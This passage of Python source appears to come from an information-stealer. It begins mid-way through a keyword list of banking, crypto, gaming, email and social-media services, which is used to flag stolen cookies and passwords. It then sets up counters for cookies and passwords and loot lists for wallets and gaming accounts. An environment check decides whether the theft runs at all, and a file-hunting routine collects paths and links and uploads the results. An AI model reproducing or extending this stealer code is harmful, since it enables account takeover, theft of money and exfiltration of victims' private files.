    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiesCount, PasswordsCount = 0, 0
cookieWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()
    for thread in wikith: thread.join()
    time.sleep(0.2)
    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"
            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)